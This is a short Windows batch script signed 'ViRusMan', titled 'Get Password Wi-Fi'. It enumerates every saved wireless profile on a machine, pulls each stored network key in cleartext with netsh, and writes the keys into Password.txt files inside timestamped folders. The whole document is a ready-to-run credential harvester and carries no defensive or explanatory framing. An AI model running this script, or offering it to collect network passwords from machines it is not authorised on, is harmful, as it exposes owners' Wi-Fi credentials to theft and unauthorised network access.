:: ViRusMan
:: 31/07/2017
:: Get Password Wi-Fi
@echo off
For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
For /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
mkdir ["%mydate%_%mytime%"]
cd ["%mydate%_%mytime%"]
mkdir WIFI
netsh wlan show profile > namewifi.txt
findstr " All " namewifi.txt > name.txt
DEL "namewifi.txt"
@echo off
setlocal enabledelayedexpansion
for /f "delims=" %%x in (name.txt) do (
	set name=%%x
	set name=!name:~27!
	echo !name! >> namewifi.txt
	)
DEL "name.txt"
for /f "delims=" %%y in (namewifi.txt) do (
	set name=%%y
	set name=!name:~0,-1!
	mkdir "!name!"
	cd !name!
	netsh wlan show profile "!name!" key=clear > "!name!".txt
	findstr "Key Content" "!name!".txt > Password.txt
	cd ..
	)
cd ..
@echo on

